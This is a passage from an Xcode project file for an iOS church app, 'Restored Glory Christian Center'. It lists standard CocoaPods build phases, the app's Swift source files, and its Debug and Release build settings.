				"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Restored Glory Christian Center/Pods-Restored Glory Christian Center-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		EF3246B658E8D6BF0DA9A44E /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Restored Glory Christian Center-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		188C9A6625CE5BD2009AC9C8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				188C9ABC25CE5E1D009AC9C8 /* ValidationManager.swift in Sources */,
				18872CC5266B3748001509FF /* NewHomeVC.swift in Sources */,
				18C5BD2125D2830600F77E80 /* Men'sMinistryVC.swift in Sources */,
				18C5BD2625D2831B00F77E80 /* Women'sMinistryVC.swift in Sources */,
				188C9ABD25CE5E1D009AC9C8 /* AppConstants.swift in Sources */,
				189B361625D5673000ABAA31 /* ChangePasswordVC.swift in Sources */,
				1860BC04266F2BC20034E63A /* UpcommingCellTableViewCell.swift in Sources */,
				18C4092625F355F0004786D9 /* SplashVC.swift in Sources */,
				B338D34126561E3B00804B42 /* PopUpListingVC.swift in Sources */,
				184B11AF25E371B1003007A2 /* SceneDelegate.swift in Sources */,
				188C9ACF25CE5E3D009AC9C8 /* Constant.swift in Sources */,
				B3FB514E26537B9E004D45D3 /* HomeScreenVC.swift in Sources */,
				188C9AC725CE5E29009AC9C8 /* ChangeBottamColor.swift in Sources */,
				184B11B125E371B1003007A2 /* AppDelegate.swift in Sources */,
				184B11AE25E371B1003007A2 /* AppFunctions.swift in Sources */,
				18C58DF625DD402900EC5379 /* ShowLinksVC.swift in Sources */,
				18CBC06225CE750100264243 /* ForgotPasswordVC.swift in Sources */,
				18F736582609AFC600C31214 /* AboutUSVC.swift in Sources */,
				188C9AC525CE5E29009AC9C8 /* HelperMethods.swift in Sources */,
				188C9ABE25CE5E1D009AC9C8 /* DisplayAlertManager.swift in Sources */,
				18872CD8266B3AAE001509FF /* HomeCVCell.swift in Sources */,
				184E4CBC25D154E100330A10 /* ProfileVC.swift in Sources */,
				B339DA29265CCD22008EE471 /* Gif file.swift in Sources */,
				184E4CC125D154F900330A10 /* EditProfileVC.swift in Sources */,
				18CBC05D25CE74EA00264243 /* SignUpVC.swift in Sources */,
				184E4CCB25D1555900330A10 /* PushMessageVC.swift in Sources */,
				18C5BD1C25D282A400F77E80 /* AnnouncementsVC.swift in Sources */,
				18F736602609D23700C31214 /* ContactUSVC.swift in Sources */,
				184E4CC625D1553200330A10 /* AdminVC.swift in Sources */,
				18F736682609D7CB00C31214 /* AddEventVC.swift in Sources */,
				18872CCF266B3A7A001509FF /* HomeCell.swift in Sources */,
				184B11AD25E371B1003007A2 /* ImagePicker.swift in Sources */,
				18872CE3266B3ADB001509FF /* HeaderView.swift in Sources */,
				18D936A525D3EE610013E166 /* ChoirRehearsal.swift in Sources */,
				188C9AC625CE5E29009AC9C8 /* Activityloader.swift in Sources */,
				B3261247264D5BFB0057593B /* DetailsDataVC.swift in Sources */,
				B3D6995D265503B30023F3C9 /* NotificationsVC.swift in Sources */,
				B3DF2D382654E01900A79D59 /* ListingVC.swift in Sources */,
				18F49E6E25D407B600604C69 /* DetailsVC.swift in Sources */,
				18C5BD1725D26AA100F77E80 /* AddLinkVC.swift in Sources */,
				18E9780B25CE7DEF000D1F8D /* SideMenuController.swift in Sources */,
				1860BC16266F30C30034E63A /* LiveStreamCell.swift in Sources */,
				184B11B025E371B1003007A2 /* AppExtensions.swift in Sources */,
				18E9781825CE8522000D1F8D /* SideMenuVC.swift in Sources */,
				188C9AD025CE5E3D009AC9C8 /* Reachability.swift in Sources */,
				18C8B601263D275C00B7039C /* ShowDescriptioVC.swift in Sources */,
				188C9ACE25CE5E3D009AC9C8 /* AFWrapperClass.swift in Sources */,
				B3225C7026579E29008FA3A7 /* TermUseVC.swift in Sources */,
				18E9781025CE7E6C000D1F8D /* HomeVC.swift in Sources */,
				18CBC05825CE74DB00264243 /* SignInVC.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		188C9A7C25CE5BD3009AC9C8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				188C9A8525CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		188C9A8725CE5BD3009AC9C8 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				188C9A9025CE5BD3009AC9C8 /* Restored_Glory_Christian_CenterUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		188C9A8225CE5BD3009AC9C8 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 188C9A6925CE5BD2009AC9C8 /* Restored Glory Christian Center */;
			targetProxy = 188C9A8125CE5BD3009AC9C8 /* PBXContainerItemProxy */;
		};
		188C9A8D25CE5BD3009AC9C8 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 188C9A6925CE5BD2009AC9C8 /* Restored Glory Christian Center */;
			targetProxy = 188C9A8C25CE5BD3009AC9C8 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		188C9A7325CE5BD2009AC9C8 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				188C9A7425CE5BD2009AC9C8 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		188C9A7825CE5BD3009AC9C8 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				188C9A7925CE5BD3009AC9C8 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		188C9A9225CE5BD3009AC9C8 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		188C9A9325CE5BD3009AC9C8 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		188C9A9525CE5BD3009AC9C8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = A1368F0782F7E87F5D32EFD2 /* Pods-Restored Glory Christian Center.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = "Restored Glory Christian Center/Restored Glory Christian Center.entitlements";
				CODE_SIGN_IDENTITY = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 3.6;
				DEVELOPMENT_TEAM = T5AAKPB89X;
				INFOPLIST_FILE = "Restored Glory Christian Center/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.restoredglory.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "Restored Glory Dist 11 mar 21";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		188C9A9625CE5BD3009AC9C8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = DDB68BD9D6441B8619644B6E /* Pods-Restored Glory Christian Center.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = "Restored Glory Christian Center/Restored Glory Christian Center.entitlements";
				CODE_SIGN_IDENTITY = "iPhone Distribution";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 3.6;
				DEVELOPMENT_TEAM = T5AAKPB89X;
				INFOPLIST_FILE = "Restored Glory Christian Center/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.restoredglory.app;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "Restored Glory Dist 11 mar 21";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		188C9A9825CE5BD3009AC9C8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 27BA2699F42BF596E7600F40 /* Pods-Restored Glory Christian CenterTests.debug.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "Restored Glory Christian CenterTests/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "dharmaniApps.Restored-Glory-Christian-CenterTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Restored Glory Christian Center.app/Restored Glory Christian Center";
			};
			name = Debug;
		};
		188C9A9925CE5BD3009AC9C8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 9552839347FE18B41D6F2D69 /* Pods-Restored Glory Christian CenterTests.release.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "Restored Glory Christian CenterTests/Info.plist";
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "dharmaniApps.Restored-Glory-Christian-CenterTests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Restored Glory Christian Center.app/Restored Glory Christian Center";
			};
			name = Release;
		};
		188C9A9B25CE5BD3009AC9C8 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = DE339622DB02969CE64D330C /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.debug.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "Restored Glory Christian CenterUITests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "dharmaniApps.Restored-Glory-Christian-CenterUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "Restored Glory Christian Center";
			};
			name = Debug;
		};
		188C9A9C25CE5BD3009AC9C8 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 4E193DCF2BB9B6F21C9A5E52 /* Pods-Restored Glory Christian Center-Restored Glory Christian CenterUITests.release.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = "Restored Glory Christian CenterUITests/Info.plist";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "dharmaniApps.Restored-Glory-Christian-CenterUITests";
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = "Restored Glory Christian Center";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		188C9A6525CE5BD2009AC9C8 /* Build configuration list for PBXProject "Restored Glory Christian Center" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				188C9A9225CE5BD3009AC9C8 /* Debug */,
				188C9A9325CE5BD3009AC9C8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		188C9A9425CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian Center" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				188C9A9525CE5BD3009AC9C8 /* Debug */,
				188C9A9625CE5BD3009AC9C8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		188C9A9725CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian CenterTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				188C9A9825CE5BD3009AC9C8 /* Debug */,
				188C9A9925CE5BD3009AC9C8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		188C9A9A25CE5BD3009AC9C8 /* Build configuration list for PBXNativeTarget "Restored Glory Christian CenterUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				188C9A9B25CE5BD3009AC9C8 /* Debug */,
				188C9A9C25CE5BD3009AC9C8 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 188C9A6225CE5BD2009AC9C8 /* Project object */;
}
